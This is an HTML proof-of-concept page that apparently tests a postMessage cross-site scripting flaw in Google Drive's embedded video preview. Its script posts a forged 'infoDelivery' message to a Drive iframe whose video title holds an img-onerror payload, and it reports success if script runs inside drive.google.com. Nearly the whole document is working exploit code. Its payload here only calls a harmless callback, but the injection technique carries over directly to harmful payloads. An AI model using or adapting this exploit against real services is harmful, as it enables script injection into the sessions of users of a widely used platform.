<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Google Drive postMessage Exploit PoC</title>
  <style>
    body { font-family: sans-serif; }
    #status { margin-top: 20px; font-size: 1.2em; color: red; }
  </style>
</head>
<body>
  <h2>Google Drive postMessage Exploit PoC</h2>
  <p>
    If vulnerable, Drive will execute injected JavaScript. <br>
    A red message will appear below if the payload succeeds.
  </p>

  <!-- Victim iframe (replace FILE_ID with your test video) -->
  <iframe id="victim" 
          src="https://drive.google.com/file/d/1-8sZYG1WZVbEN2txGkJseHvS88P4nRri/preview" 
          width="800" height="600">
  </iframe>

  <div id="status">[Waiting for test result...]</div>

  <script>
    // This function will be called if exploit succeeds
    function exploitSuccess() {
      document.getElementById("status").textContent = 
        "âœ… Exploit succeeded: JS executed inside drive.google.com";
      document.getElementById("status").style.color = "green";
    }

    // Payload to inject into Drive
    const payload = {
      event: "infoDelivery",
      info: {
        videoData: {
          // Inject JS that calls back to exploitSuccess()
          title: `<img src=x onerror="parent.exploitSuccess()">`
        }
      },
      channel: "widget",
      id: 1337
    };

    // Send payload after iframe loads
    document.getElementById("victim").onload = function() {
      document.getElementById("victim").contentWindow.postMessage(
        JSON.stringify(payload),
        "*" // attacker-controlled origin
      );
    };
  </script>
</body>
</html>
